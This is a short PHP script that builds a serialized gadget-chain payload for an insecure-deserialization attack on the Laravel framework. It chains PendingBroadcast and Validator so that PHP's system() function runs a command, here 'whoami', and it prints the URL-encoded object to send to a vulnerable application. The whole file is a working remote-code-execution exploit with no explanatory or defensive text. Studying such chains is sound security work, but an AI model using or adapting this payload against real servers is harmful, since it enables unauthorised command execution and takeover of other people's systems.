<?php
namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}

namespace Illuminate\Validation
{
    class Validator
    {
        public $extensions = [];
        public function __construct()
        {
            $this->extensions=[''=>'system'];
        }
    }
}


namespace {
    $a=new Illuminate\Validation\Validator();
    $b='whoami';
    $c = new Illuminate\Broadcasting\PendingBroadcast($a, $b);
    echo urlencode(serialize($c));
}
